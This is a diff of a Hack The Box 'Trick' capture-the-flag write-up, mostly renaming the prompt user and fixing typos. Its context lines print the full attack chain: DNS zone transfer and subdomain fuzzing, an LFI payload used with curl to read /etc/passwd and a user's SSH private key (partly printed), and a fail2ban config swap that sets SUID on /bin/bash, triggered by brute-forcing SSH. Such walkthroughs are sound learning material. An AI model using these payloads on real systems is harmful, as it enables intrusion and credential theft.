@@ -17,9 +17,9 @@ draft: false
 ```nmap``` scans four open ports ```ssh(22)```, ```smtp(25)```, ```dns(53)``` and ```http(80)```
 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sudo nmap -A -T4 -sC -sV -p- 10.129.38.208
-[sudo] password for luca: 
+[sudo] password for kali: 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 14:19 CEST
 Nmap scan report for 10.129.38.208
 Host is up (0.024s latency).
@@ -65,9 +65,9 @@ Nmap done: 1 IP address (1 host up) scanned in 272.42 seconds
 
 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sV -sU 10.129.38.208
-[sudo] password for luca: 
+[sudo] password for kali: 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 14:20 CEST
 Not shown: 996 closed udp ports (port-unreach)
 PORT     STATE         SERVICE  VERSION
@@ -84,7 +84,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1141.77 seconds
 Since DNS Port ```53``` is open I've added the  `machinename` as usual to my `/etc/hosts` file to start off with ```DNS enumeration```.
 
 ```
-┌──(luca㉿kali)-[~/htb/trick]
+┌──(kali㉿kali)-[~/htb/trick]
 └─$ cat /etc/hosts
 127.0.0.1       localhost
 127.0.1.1       kali
@@ -98,7 +98,7 @@ ff02::2 ip6-allrouters
 ### DNS Zone Transfer
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ dig axfr @10.129.38.208 trick.htb
 
 ; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.129.38.208 trick.htb
@@ -124,7 +124,7 @@ We succesfully transfered some DNS entries:
 I've added the Subdomain to my hosts file:
 
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ cat /etc/hosts
 127.0.0.1       localhost
 127.0.1.1       kali
@@ -138,7 +138,7 @@ ff02::2 ip6-allrouters
 ### Directory Bruteforce on Subdomain
 
 ```
-┌──(luca㉿kali)-[~/htb/trick]
+┌──(kali㉿kali)-[~/htb/trick]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://preprod-payroll.trick.htb/ -e -s 200 -no-status
 ===============================================================
 Gobuster v3.1.0
@@ -217,11 +217,11 @@ Login as ```Enemigosss``` confirms the credentials validity.
 
 ## Further Enumeration and User Access
 
-I used ```ffuf``` for  subdomain enumeration in before I found the ```preprod-payroll``` subdomain via DNS zone transfer, but it was not able to find any subdomains.
-The preprod-payroll subdomain kind of gives away that subdomains may follow a ```naming scheme``` so i've spun up ```fuff``` a second time:
+I used ```ffuf``` for  subdomain enumeration before I found the ```preprod-payroll``` subdomain via DNS zone transfer, but it was not able to find any other subdomains.
+The ```preprod-payroll``` subdomain kind of gives away that subdomains may follow a ```naming scheme``` so i've spun up ```fuff``` a second time:
 
 ```
-┌──(luca㉿kali)-[~/htb/trick]
+┌──(kali㉿kali)-[~/htb/trick]
 └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: preprod-FUZZ.trick.htb" -u http://trick.htb --fs 5480
 
         /'___\  /'___\           /'___\       
@@ -257,7 +257,7 @@ I've added ```preprod-marketing.trick.htb``` to my hosts.
 |preprod-marketing.trick.htb|
 
 ```
-┌──(luca㉿kali)-[~/htb/trick]
+┌──(kali㉿kali)-[~/htb/trick]
 └─$ cat /etc/hosts                                                   
 127.0.0.1       localhost
 127.0.1.1       kali
@@ -267,13 +267,13 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 10.129.38.208   trick.htb preprod-payroll.trick.htb preprod-marketing.trick.htb
 ```
-The ```page``` URL parameter seemed very suspicous and it actually had a LFI vulnerability, which I've found after some trial and error with Burp.
+The ```page``` URL parameter seemed very suspicous and it actually had a LFI vulnerability, which I've found after some trial and error with ```Burp```.
 
 http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
 
 
 ```
-┌──(luca㉿kali)-[~/htb/trick]
+┌──(kali㉿kali)-[~/htb/trick]
 └─$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -326,7 +326,7 @@ michael:x:1001:1001::/home/michael:/bin/bash
 
 I've checked if a ```private key``` existed in ```michaels``` ```homedir``` and grabbed ```id_rsa``` to get shell:
 ```
-┌──(luca㉿kali)-[~/htb/trick]
+┌──(kali㉿kali)-[~/htb/trick]
 └─$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
@@ -390,7 +390,7 @@ IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
 
 SSH into the box:
 ```
-┌──(luca㉿kali)-[~/htb/trick]
+┌──(kali㉿kali)-[~/htb/trick]
 └─$ chmod 0400 id_rsa && ssh michael@trick.htb -i id_rsa                                                      130 ⨯
 Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
 
@@ -423,7 +423,7 @@ User michael may run the following commands on trick:
 ```
  I decided to not run ```linpeas.sh``` and investigate on ```fail2ban``` first.
  
-I've found a blogpost we can try to follow. I also could confirm that we are in the group ```security``` which has write privileges on ```/etc/fail2ban/action.d``` which is a ```requirement``` for this exploit.
+Eventually I've found a blogpost we can try to follow along. I also could confirm that we are in the group ```security``` which has write privileges on ```/etc/fail2ban/action.d``` which is a ```requirement``` for this exploit.
 https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
 ```
 michael@trick:~$ ls -la /etc/fail2ban/
@@ -456,12 +456,12 @@ banaction = iptables-multiport
 banaction_allports = iptables-allports
 ```
 
-I could not edit the existing ```iptables-mulitport.conf```, but i was able to delete it and copy a ```malicious``` config i created in ```/tmp``` into the directoy. 
+I could not edit the existing ```iptables-mulitport.conf```, but i was able to delete it and copy a ```malicious``` config I created in ```/tmp``` into the directory. 
 
-Note: This was a bit fiddely because some ```cronjob``` or script reset the folders contents every few minutes, so kind of a ```race condition```.
+Note: This was a bit fiddely because some ```cronjob``` or script reset the folders contents every few minutes.
 
 
-We need to add the following payload into the rule to set an SUID for ```/bin/bash```:
+We need to add the following payload into the rule to set an SUID for ```/bin/bash``` when the ```actionban``` triggers:
 
 ```actionban = chmod 4755 /bin/bash```
 
@@ -523,18 +523,18 @@ actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
 [Init]
 `
 ```
-Restarting the service with sudo, so the new config get's loaded :
+Restarting the service with sudo, so the new config gets loaded :
 
 ```
 michael@trick:/etc/fail2ban$ sudo /etc/init.d/fail2ban restart
 [ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
 ```
 
-So the last thing left todo is triggering the action by bruteforcing ssh.
+The last thing left todo is triggering the action by bruteforcing ssh.
 
 Trigger the ```actionban``` by bruteforcing SSH:
 ```
-┌──(luca㉿kali)-[~]
+┌──(kali㉿kali)-[~]
 └─$ crackmapexec ssh trick.htb -u /usr/share/wordlists/rockyou.txt -p gimmeroot  
 ```
 
